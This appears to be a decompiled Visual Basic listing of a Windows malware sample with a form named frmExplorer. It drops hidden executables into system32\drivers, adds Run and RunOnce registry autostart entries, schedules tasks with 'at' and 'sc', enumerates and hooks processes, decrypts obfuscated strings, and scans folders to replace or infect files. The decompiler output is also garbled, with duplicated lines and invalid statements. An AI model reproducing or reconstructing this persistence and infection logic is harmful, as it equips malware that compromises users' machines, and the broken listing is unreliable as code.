      GoTo loc_0040E666
    End If
    var_eax = FindNextFileA(var_2C, var_56C, " ?")
    var_2DC = FindNextFileA(var_2C, var_56C, " ?")
    If var_2DC <> 0 Then GoTo loc_0040E48C
  loc_0040E666: 
    var_eax = FindClose(var_2C, " ?", var_288)
  End If
  If Len(var_34) > 0 Then
    var_eax = Proc_2_22_41C410(var_34, var_56C, var_56C)
    If Proc_2_22_41C410(var_34, var_56C, var_56C) Then
      var_eax = Proc_1_9_415AF0(var_34, var_288)
    End If
  End If
  %x1 = arg_8.ForeColor = %x1 = arg_8.ForeColor + 00000001h
  If %x1 = arg_8.ForeColor > 0 Then
    var_eax = Proc_2_17_41A5A0(global_00407CCC & global_0042C0B0 & global_00407CCC & global_0042C150 & global_00407CCC)
    If Len(global_0042C15C) > 0 Then
      arg_8.AddRef 'Ignore this = arg_8.AddRef 'Ignore this + 00000001h
      If arg_8.Release 'Ignore this = 0 Then
        Len(global_0042C15C) = Len(global_0042C15C) + 00000001h
      End If
      var_eax = Proc_1_9_415AF0(global_0042C160)
      var_290 = "d<LîbtökyL@NŒ£†øúë≈•ç"
      var_eax = Proc_1_1_4115D0(var_290)
      arg_8.AddRef 'Ignore this = arg_8.AddRef 'Ignore this + 00000001h
      var_29C = "°o}—°†Ÿè®ãgv=?<óyr∞òâyn\©ëz:sT"
      var_eax = Proc_1_1_4115D0(var_29C)
      var_2A8 = Proc_1_1_4115D0(var_290) & Mid$(global_0042C15C, arg_8.AddRef, ) & Proc_1_1_4115D0(var_29C)
      var_eax = Proc_2_24_41E730(var_2A8, global_0042C160)
      var_2E8 = Proc_2_24_41E730(var_2A8, global_0042C160)
      If var_2E8 Then
        var_eax = Proc_1_4_411F00(global_0042C160)
        If Proc_1_4_411F00(global_0042C160) Then
          global_0042C15C = 00408114h
          GoTo loc_0040EA63
        End If
        var_eax = Proc_1_3_411B30
  loc_0040EA63: 
        SetAttr global_0042C160, 39
      End If
      arg_8.AddRef 'Ignore this = arg_8.AddRef 'Ignore this + 00000001h
    End If
    If Len(global_0042C0C4) > 0 Then
      If 0042C0C8h > var_42C12C Then
        arg_8.GetTypeInfoCount 'Ignore this = arg_8.GetTypeInfoCount 'Ignore this + 00000001h
        If arg_8.GetTypeInfo 'Ignore this = 0 Then
          Len(global_0042C0C4) = Len(global_0042C0C4) + 00000001h
        End If
        var_eax = Proc_1_9_415AF0(global_0042C158 & global_00406BFC & global_0042C148)
        arg_8.GetTypeInfoCount 'Ignore this = arg_8.GetTypeInfoCount 'Ignore this + 00000001h
        var_298 = global_0042C158 & global_00406BFC & global_0042C148
        var_294 = Mid$(global_0042C0C4, arg_8.GetTypeInfoCount, )
        var_eax = Proc_2_24_41E730(var_294, var_298)
        var_2E8 = Proc_2_24_41E730(var_294, var_298)
        If var_2E8 Then
          var_eax = Proc_1_9_415AF0(global_0042C158)
          var_294 = global_0042C158 & global_00406BFC & global_0042C148
          var_eax = Proc_3_8_420670(var_294, global_0042C158, var_2D8)
          var_2E8 = Proc_3_8_420670(var_294, global_0042C158, var_2D8)
          If var_2E8 Then
            SetAttr global_0042C158, 39
            var_2CC = global_0042C158
            var_2E4 = Shell(global_0042C158, 0)
          End If
        End If
        arg_8.GetTypeInfoCount 'Ignore this = arg_8.GetTypeInfoCount 'Ignore this + 00000001h
      End If
    End If
    var_578 = global_0042C074
    GoTo loc_0040EE34
  loc_0040EE22: 
    var_24 = var_24 + var_574
    var_24 = var_24+var_574
  loc_0040EE34: 
    If var_24 <= global_0042C074 Then
      If var_2EC Then
        If var_2EC = 1 Then
          var_24 = var_24 - eax+00000014h
          var_2E8 = var_24
          If var_2E8 < 0 Then
            GoTo loc_0040EEAD
          End If
          var_eax = Err.Raise
          var_5AC = Err.Raise
  loc_0040EEAD: 
          var_5B0 = var_2E8 * 36
          GoTo loc_0040EECA
        End If
      End If
      var_eax = Err.Raise
      var_5B0 = Err.Raise
  loc_0040EECA: 
      arg_8.GetTypeInfoCount 'Ignore this = arg_8.GetTypeInfoCount 'Ignore this + var_5B0
      If arg_8.AddRef 'Ignore this Then
        If Len(arg_8.Release) > 0 Then
          var_38 = InStr(, arg_8.Release, global_00406F58, 0)
          If var_38 = 0 Then
            var_30 = arg_8.Release 'Ignore this
            GoTo loc_0040F051
          End If
          var_38 = var_38 - 00000001h
          var_30 = Left$(arg_8.Release, )
          var_570(3) = Mid$(arg_8.Release, 10, ) & global_00406F58 & var_30
  loc_0040F051: 
          var_eax = Proc_1_9_415AF0(global_0042C130 & "system32\drivers\" & CStr(var_24) & "picsys." & global_0042C148)
          var_2A0 = global_0042C130 & "system32\drivers\" & CStr(var_24) & "picsys." & global_0042C148
          var_eax = Proc_2_24_41E730(var_30, var_2A0)
          var_2E8 = Proc_2_24_41E730(var_30, var_2A0)
          If var_2E8 Then
            var_2A4 = global_0042C130 & "system32\drivers\"
            var_2A0 = global_0042C130 & "system32\drivers\" & CStr(var_24) & "picsys." & global_0042C148
            var_eax = Proc_3_8_420670(var_2A0, var_2A4, var_2D8)
            var_2E8 = Proc_3_8_420670(var_2A0, var_2A4, var_2D8)
            If var_2E8 Then
            End If
          End If
        End If
      End If
      GoTo loc_0040EE22
    End If
    If Len(global_0042C0BC) > 0 Then
      var_eax = Proc_1_9_415AF0(global_0042C154 & global_00406BFC & global_0042C148, var_2EC)
      var_294 = global_0042C154 & global_00406BFC & global_0042C148
      var_eax = Proc_2_24_41E730(global_0042C0BC, var_294)
      var_2E8 = Proc_2_24_41E730(global_0042C0BC, var_294)
      If var_2E8 Then
        var_eax = Proc_1_9_415AF0(global_0042C154)
        var_294 = global_0042C154 & global_00406BFC & global_0042C148
        var_eax = Proc_3_8_420670(var_294, global_0042C154, var_2D8)
        var_2E8 = Proc_3_8_420670(var_294, global_0042C154, var_2D8)
        If var_2E8 Then
          SetAttr global_0042C154, 39
          If Len(global_0042C0C0) > 0 Then
            var_290 = global_0042C154 & global_004086A8
            var_2BC = var_290 & global_0042C0C0
            var_2E4 = Shell(var_290 & global_0042C0C0, 0)
            GoTo loc_0040F5B7
          End If
          var_2CC = global_0042C154
          var_2E4 = Shell(global_0042C154, 0)
  loc_0040F5B7: 
          global_0042C0BC = 00408114h
        End If
      End If
    End If
    If Len(global_0042C0A4) > 0 Then
      var_580 = global_0042C0A8
      GoTo loc_0040F621
  loc_0040F60F: 
      var_24 = var_24 + var_57C
      var_24 = var_24+var_57C
  loc_0040F621: 
      If var_24 <= global_0042C0A8 Then
        var_2CC = global_0042C0A4
        var_2E4 = Shell(global_0042C0A4, 0)
        GoTo loc_0040F60F
      End If
      If var_42C0AC Then
        global_0042C0A4 = 00408114h
      End If
    End If
    If Len(global_0042C0B4) > 0 Then
      var_eax = Proc_4_5_4228E0(global_0042C150)
      If global_42C12C > 0 Then
        var_eax = Proc_1_9_415AF0(global_0042C150)
        var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C150)
        SetAttr global_0042C150, 39
      End If
      var_2BC = global_0042C150 & " AO"
      var_2E4 = Shell(global_0042C150 & " AO", 0)
    End If
  End If
  SetAttr global_0042C158, 38
  var_eax = DeleteFileA(global_0042C158)
  var_ret_3 = var_290
  GoTo loc_0040F815
  Exit Sub
  loc_0040F815: 
  Exit Sub
End Sub

Private Sub Timer1_Timer() '40DBF0
  Dim arg_8 As Me
  Dim var_38 As Me
  Dim var_50(199) As Long
  On Error Resume Next
  var_eax = GetForegroundWindow(FFFFFFFFh, var_50, 00408078h, 00000003h)
  var_2B4 = GetForegroundWindow(FFFFFFFFh, var_50, 00408078h, 00000003h)
  If ecx <> GetForegroundWindow(FFFFFFFFh, var_50, 00408078h, 00000003h) Then
    var_eax = GetForegroundWindow(esi)
    var_2B4 = GetForegroundWindow(esi)
    var_eax = GetWindowThreadProcessId(arg_8.SaveProp)
    var_eax = Proc_8_5_429F50(global_80000001, global_0042C11C, global_0042C120)
    var_eax = Proc_8_1_4296C0(global_0042C0D4, 0, ebx)
  End If
  var_eax = CreateToolhelp32Snapshot(0000000Fh)
  var_2B4 = CreateToolhelp32Snapshot(0000000Fh)
  var_2C = var_2B4
  var_eax = Process32First(var_2C, var_2B4, global_00405598)
  var_30 = Process32First(var_2C, var_2B4, global_00405598)
  var_28 = Space$(260)
  loc_0040DDD2: 
  If var_30 Then
    var_eax = OpenProcess(00000410h, 00000000h, var_280, global_00405598, var_288)
    var_290 = OpenProcess(00000410h, 00000000h, var_280, global_00405598, var_288)
    00000001h = 00000001h - 00000001h
    If var_2C0 < 200 Then
      GoTo loc_0040DE4E
    End If
    var_eax = Err.Raise
    var_528 = Err.Raise
  loc_0040DE4E: 
    var_ret_1 = var_28
    var_eax = SetWindowsHookEx(var_290, var_44(var_2C0*4), var_ret_1, var_58)
    var_ret_2 = var_298
    var_298 = Left$(var_28, SetWindowsHookEx(var_290, var_44(var_2C0*4), var_ret_1, var_58))
    var_eax = Proc_2_13_419F80(var_298, var_3E8, var_3E8)
    var_5C = LCase$(Proc_2_13_419F80(var_298, var_3E8, var_3E8))
    If Len(var_5C) > 0 Then
      If arg_8(15) Then
        If (var_5C = global_0042C0DC) = 0 Then
          var_eax = Proc_2_14_41A090(var_280, var_288, 0)
        End If
        If var_28C Then
          If var_38 = 0 Then
            var_298 = "w^[RcYSLﬂò†PODÄÅgàrewÄe"
            arg_8 = arg_8 + 00000034h
            var_eax = Proc_2_11_419B10(arg_8+00000034h, fs:[00000000h], )
            var_29C = Proc_2_11_419B10(arg_8+00000034h, fs:[00000000h], )
            var_eax = Proc_1_1_4115D0(var_298, Proc_2_13_419F80(var_298, var_3E8, var_3E8), )
            var_2A0 = Proc_1_1_4115D0(var_298, Proc_2_13_419F80(var_298, var_3E8, var_3E8), )
            eax = ( = var_2A0) + 1
            var_2C0 = ( = var_2A0) + 1
            If var_2C0 Then
              global_0042C170 = var_5C
            End If
          End If
        End If
        GoTo loc_0040E091
      End If
      If (var_5C = global_0042C0D4) = 0 Then
        var_eax = Proc_2_14_41A090(var_280, , )
  loc_0040E091: 
  loc_0040E091: 
  loc_0040E091: 
    var_eax = Process32Next(var_2C, var_288, global_00405598)
    var_30 = Process32Next(var_2C, var_288, global_00405598)
    GoTo loc_0040DDD2
  End If
  var_eax = CloseHandle(var_2C)
  If arg_8(15) Then
    If var_24 = 0 Then
      var_eax = Proc_4_5_4228E0(global_0042C0E4, global_00405598, var_288)
      If global_42C12C > 0 Then
        var_eax = Proc_1_9_415AF0(global_0042C0E4, var_510, var_510)
        var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C0E4, var_288)
        SetAttr global_0042C0E4, 39
      End If
      var_2A8 = global_0042C0E4 & " SE"
      var_2BC = Shell(global_0042C0E4 & " SE", 0)
    End If
    GoTo loc_0040E291
  End If
  If var_294 = 0 Then
    var_eax = Proc_4_5_4228E0(global_0042C0E4, )
    If global_42C12C > 0 Then
      var_eax = Proc_1_9_415AF0(global_0042C0E4)
      var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C0E4)
      SetAttr global_0042C0E4, 39
    End If
    var_2A8 = global_0042C0E4 & " PR"
    var_2BC = Shell(global_0042C0E4 & " PR", 0)
  loc_0040E291: 
  loc_0040E291: 
  DoEvents
  GoTo loc_0040E2DA
  Exit Sub
  loc_0040E2DA: 
  var_2B4 = var_50
End Sub

Private Sub tmrSec_Timer() '40F880
  Dim arg_8 As Me
  Dim global_004077C4 As 
  On Error Resume Next
  var_eax = Proc_8_5_429F50(global_80000001, global_0042C11C, global_0042C120)
  var_eax = Proc_8_5_429F50(global_80000002, global_0042C124, "Start")
  var_eax = Proc_8_5_429F50(global_80000002, global_0042C128, "Start")
  var_28 = global_0042C0D4 & " RO"
  var_eax = Proc_8_6_42A090(global_80000002, global_0042C10C & "Once", global_0042C0D8)
  var_eax = Proc_8_6_42A090(global_80000002, global_0042C10C & "Once", global_0042C0E0)
  var_eax = Proc_8_1_4296C0(global_0042C0D4, global_0042C0DC & " RO", global_0042C0DC & " RO")
  var_eax = Proc_4_5_4228E0(global_0042C0F4, 4, 2)
  If global_42C12C > 0 Then
    var_eax = Proc_1_9_415AF0(global_0042C0F4, 0, -1)
    var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C0F4, edi)
    SetAttr global_0042C0F4, 39
  End If
  var_eax = Proc_8_2_429830(global_0042C0F4 & " MR", global_0042C110, global_0042C114)
  var_eax = frmExplorer.VTable_00000730
  var_70 = frmExplorer.VTable_00000730
  var_eax = frmExplorer.VTable_00000730
  var_70 = frmExplorer.VTable_00000730
  var_eax = frmExplorer.Proc_0_8_40CFE0(arg_8, arg_8, var_34, var_34, CreateObject(global_004075DC), arg_8, var_34)
  var_24 = "bTMßáÉÖ^nµ~íëpsVjH\dJ∂°âhvS"
  var_eax = Proc_1_1_4115D0(var_24, global_0042C130, var_34)
  var_28 = Proc_1_1_4115D0(var_24, global_0042C130, var_34)
  var_3C = Proc_8_2_429830(var_24, global_0042C110, global_0042C114) & var_28
  var_eax = Kill 8
  0 = Time$
  var_3C = var_28
  var_2C = "at " & FormatDateTime(DateAdd(global_00407C78, 0, global_40000000), 4) & global_0042C100
  var_5C = var_2C & global_0042C0CC
  var_6C = Shell(var_2C & global_0042C0CC, 0)
  If global_004077C4.GetIDsOfNames(%StkVar1, %StkVar2, %StkVar3, %StkVar4, %StkVar5) > 0 Then
    var_eax = Proc_1_1_4115D0(var_24, global_0042C118, 0)
    var_8C = Proc_1_1_4115D0(var_24, global_0042C118, 0)
    var_3C = var_8C
    var_6C = Shell(var_8C, 0)
    var_3C = "sc" & global_0042C104
    var_6C = Shell("sc" & global_0042C104, 0)
    var_3C = "sc" & global_0042C108
    var_6C = Shell("sc" & global_0042C108, 0)
    var_eax = Proc_4_5_4228E0(global_0042C0FC)
    If global_42C12C > 0 Then
      var_eax = Proc_1_9_415AF0(global_0042C0FC)
      var_eax = Proc_4_9_4259A0(global_0042C0CC, global_0042C0FC)
      SetAttr global_0042C0FC, 39
    End If
    var_eax = Proc_3_4_41F2C0(global_0042C13C, global_0042C140)
    var_eax = Proc_3_2_41EB20
  End If
  GoTo loc_0040FF04
  Exit Sub
  loc_0040FF04: 
  Exit Sub
End Sub

Private Sub uExWatch1_UnknownEvent_9 '410710
  On Error Resume Next
  var_eax = Proc_1_6_415780(arg_10, -1, edi)
  If Proc_1_6_415780(arg_10, -1, edi) Then
    var_28C = Right$(arg_10, 1)
    eax = (var_28C = global_00406544) + 1
    var_2C4 = (var_28C = global_00406544) + 1
    If var_2C4 Then
      var_2C = arg_10
      GoTo loc_00410824
    End If
    var_2C = arg_10 & global_00406544
  loc_00410824: 
    If InStr(1, var_2C, global_0042C138, 1) = 0 Then
      If global_42C12C = -1 Then
        var_eax = GetForegroundWindow(0)
      End If
      var_ret_1 = var_2C & "*." & global_0042C144
      var_eax = FindFirstFileA(var_ret_1, var_404, " ?")
      var_28 = FindFirstFileA(var_ret_1, var_404, " ?")
      If var_28 <> -1 Then
  loc_0041095C: 
        call __vbaStrFixstr(00000104h, var_258, " ?", var_284, var_404, var_404, var_284, ebx)
        var_28C = __vbaStrFixstr(00000104h, var_258, " ?", var_284, var_404, var_404, var_284, ebx)
        var_eax = Proc_2_19_41AD60(var_28C)
        call __vbaLsetFixstr(00000104h, var_258, var_28C)
        var_24 = Proc_2_19_41AD60(var_28C)
        var_30 = var_2C & var_24
        var_2C0 = InStrRev(var_24, global_00406BFC, -1, 0)
        var_288 = LCase$(Mid$(var_24, FindFirstFileA(var_ret_1, var_404, " ?")(1), 10))
        If (var_288 = global_0042C144) = 0 Then
          var_eax = Proc_1_5_4156D0(var_30)
          If Proc_1_5_4156D0(var_30) Then
            var_eax = Proc_4_4_422700(var_30)
            var_34 = Proc_4_4_422700(var_30)
            var_290 = Left$(var_34, 3)
            var_eax = Proc_1_1_4115D0(var_28C, var_290)
            var_2C4 = ( = Proc_1_1_4115D0(var_28C, var_290))
            If var_2C4 Then
              var_eax = Proc_1_1_4115D0(var_28C, var_34)
              var_2C4 = ( = Proc_1_1_4115D0(var_28C, var_34))
              If var_2C4 Then
                var_eax = Proc_1_9_415AF0(var_30 & global_00408794)
                var_28C = var_30 & global_00408794
                var_eax = Proc_4_9_4259A0(global_0042C0CC, var_28C)
                var_2C4 = Proc_4_9_4259A0(global_0042C0CC, var_28C)
                If var_2C4 Then
                  SetAttr var_30 & global_00408794, 6
                  DoEvents
                  var_eax = Proc_1_9_415AF0(global_0042C0F0)
                  var_eax = Proc_4_7_422F50(var_30, global_0042C0F0, var_298)
                  DoEvents
                  var_eax = Proc_4_10_426070(var_30 & global_00408794, global_0042C0F0, 32)
                  DoEvents
                  var_28C = var_30 & global_00408794
                  var_eax = Proc_4_1_4214E0(var_28C, var_30, var_298)
                  var_2C4 = Proc_4_1_4214E0(var_28C, var_30, var_298)
                  If var_2C4 Then
                    DoEvents
                    var_eax = Proc_1_9_415AF0(var_30, 0, 0)
                    call Name(var_30, var_30 & global_00408794, var_564, var_564)
                    SetAttr var_30, 0
                  End If
                End If
                GoTo loc_00410EC4
              End If
              var_eax = Proc_4_6_422BF0(var_30)
              If global_42C12C > 0 Then
                var_eax = Proc_4_3_422050(var_30)
  loc_00410EC4: 
  loc_00410EC4: 
  loc_00410EC4: 
  loc_00410EC4: 
        End If
        var_290 = global_0042C144 & Chr$(160)
        eax = (var_288 = var_290) + 1
        var_2C4 = (var_288 = var_290) + 1
        If var_2C4 Then
          var_28C = GetSetting(global_0042C0D8, "Process", "LO", &H40886C)
          eax = (var_28C = global_0040886C) + 1
          var_2C4 = (var_28C = global_0040886C) + 1
          If var_2C4 Then
            If global_42C12C = -1 Then
              var_eax = GetForegroundWindow(var_2B8, &H40886C)
            End If
            SetAttr var_30, 38
            var_eax = DeleteFileA(var_30)
            var_ret_3 = var_28C
  loc_0041105E: 
  loc_0041105E: 
  loc_0041105E: 
        DoEvents
        var_eax = FindNextFileA(var_28, var_544, " ?")
        var_2C0 = FindNextFileA(var_28, var_544, " ?")
        If var_2C0 <> 0 Then GoTo loc_0041095C
        var_eax = FindClose(var_28, " ?", var_284, var_544)
      End If
    End If
    DoEvents
  End If
  GoTo loc_0041113E
  Exit Sub
  loc_0041113E: 
End Sub

Private Sub uExWatch1_UnknownEvent_A '40FF30
  Dim arg_8 As Me
  Dim var_78 As 
  Dim var_80 As 
  On Error Resume Next
  var_74 = var_2C
  var_eax = Unknown_VTable_Call[eax+0000004Ch]
  var_78 = Unknown_VTable_Call[eax+0000004Ch]
  var_6C = var_6C - 0001h
  var_8C = var_6C
  GoTo loc_00410055
  loc_00410040: 
  var_24 = var_24 + var_88
  var_24 = var_24+var_88
  loc_00410055: 
  If var_24 <= var_6C Then
    var_eax = Unknown_VTable_Call[edx+00000040h]
    var_78 = Unknown_VTable_Call[edx+00000040h]
    GoTo loc_00410040
  End If
  var_eax = frmExplorer.VTable_00000730
  var_74 = frmExplorer.VTable_00000730
  var_eax = Unknown_VTable_Call[eax+0000004Ch]
  var_78 = Unknown_VTable_Call[eax+0000004Ch]
  var_6C = var_6C - 0001h
  var_94 = var_6C
  GoTo loc_0041021B
  loc_00410206: 
  var_24 = var_24 + var_90
  var_24 = var_24+var_90
  loc_0041021B: 
  If var_24 <= var_6C Then
    var_7C = var_CC
    var_eax = Unknown_VTable_Call[ecx+00000040h]
    var_78 = Unknown_VTable_Call[ecx+00000040h]
    var_B4 = var_30
    var_eax = Unknown_VTable_Call[eax+00000010h]
    var_80 = Unknown_VTable_Call[eax+00000010h]
    GoTo loc_00410206
  End If
  var_eax = frmExplorer.VTable_00000730
  var_74 = frmExplorer.VTable_00000730
  var_eax = frmExplorer.VTable_00000728
  var_74 = frmExplorer.VTable_00000728
  var_78 = var_2C
  var_70 = var_78.Count
  var_7C = var_70
  var_70 = var_70 - 00000001h
  var_28 = var_70
  var_9C = var_28
  GoTo loc_004104A9
  loc_00410494: 
  var_24 = var_24 + var_98
  var_24 = var_24+var_98
  loc_004104A9: 
  If var_24 <= var_28 Then
    If var_24 > 0 Then
      var_eax = frmExplorer.Proc_0_9_40D530(arg_8, var_24, arg_8, var_2C, arg_8, var_2C, var_2C)
    End If
    var_eax = frmExplorer.VTable_00000728
    var_7C = frmExplorer.VTable_00000728
    var_80 = var_2C
    var_50 = var_24
    var_80.Item
    var_84 = var_80.Item
    var_40 = var_30
    var_eax = Unknown_VTable_Call[ecx+00000040h]
    var_78 = Unknown_VTable_Call[ecx+00000040h]
    .DispID_1
    GoTo loc_00410494
  End If
  GoTo loc_004106DE
  Exit Sub
  loc_004106DE: 
  Exit Sub
End Sub

Public Sub Proc_0_8_40CFE0
  Dim var_78 As Me
  On Error Resume Next
  If FFFFFFFFh.GetPalette 'Ignore this = 0 Then
    var_eax = frmExplorer.VTable_00000728
    var_74 = frmExplorer.VTable_00000728
    var_78 = var_2C
    FFFFFFFFh.var_2C = PropBag.ReadProperty(var_70, arg_8)
    var_7C = var_78
    var_70 = var_70 - 00000001h
    var_ret_1 = var_70
    var_28 = var_ret_1
    var_8C = var_28
    GoTo loc_0040D138
  loc_0040D123: 
    var_24 = var_24 + var_88
    var_24 = var_24+var_88
  loc_0040D138: 
    If var_24 <= var_28 Then
      var_74 = var_2C
      var_eax = Unknown_VTable_Call[eax+0000004Ch]
      var_78 = Unknown_VTable_Call[eax+0000004Ch]
      var_6C = var_6C - 0001h
      If var_7C Then
        var_eax = frmExplorer.Proc_0_9_40D530(arg_8, var_24, var_74, var_6C, var_2C)
      End If
      var_eax = frmExplorer.VTable_00000728
      var_74 = frmExplorer.VTable_00000728
      var_78 = var_2C
      var_50 = var_24
      var_eax = Unknown_VTable_Call[eax+00000020h]
      var_7C = Unknown_VTable_Call[eax+00000020h]
      var_eax = frmExplorer.Proc_0_10_40D650(arg_8, var_34, var_6C, var_34, var_30, var_78, var_58, var_54)
      If var_6C = 0 Then eax = 1
      If var_80 Then
        var_eax = frmExplorer.VTable_00000728
        var_7C = frmExplorer.VTable_00000728
        var_50 = var_24
        var_eax = Unknown_VTable_Call[edx+00000020h]
        var_84 = Unknown_VTable_Call[edx+00000020h]
        var_40 = var_30
        var_eax = Unknown_VTable_Call[eax+00000040h]
        var_78 = Unknown_VTable_Call[eax+00000040h]
        .DispID_1
      End If
      GoTo loc_0040D123
    End If
  End If
  Method_8964E04D
  GoTo loc_0040D50C
  Exit Sub
  loc_0040D50C: 
  Exit Sub
End Sub

Public Sub Proc_0_9_40D530
  On Error Resume Next
  var_eax = Unknown_VTable_Call[eax+00000040h]
  var_eax = Unknown_VTable_Call[esi+0000000Ch]
  Exit Sub
  Method_8964E44D
  GoTo loc_0040D636
  Exit Sub
  loc_0040D636: 
End Sub

Public Sub Proc_0_10_40D650
  On Error Resume Next
  var_eax = Unknown_VTable_Call[eax+0000004Ch]
  var_70 = var_70 - 0001h
  var_84 = var_70
  If var_20 <= var_70-0001h Then
    var_eax = Unknown_VTable_Call[ecx+00000040h]
    var_ret_1 = CLng(Unknown_VTable_Call[ecx+00000040h])
    var_64 = var_ret_1
    var_4C = arg_C.hwnd(CLng(Unknown_VTable_Call[ecx+00000040h]))
    If (arg_8 = var_4C) = 0 Then
      var_80 = var_80 + var_20
      var_20 = var_80+var_20
      GoTo loc_0040D709
    End If
    Exit Sub
    GoTo loc_0040D821
  End If
  Exit Sub
  GoTo loc_0040D821
  Exit Sub
  loc_0040D821: 
  Exit Sub
End Sub

Public Sub Proc_0_11_4111A0
  Dim arg_8 As Me
  var_eax = frmExplorer.Proc_0_8_40CFE0(arg_8, edi)
End Sub
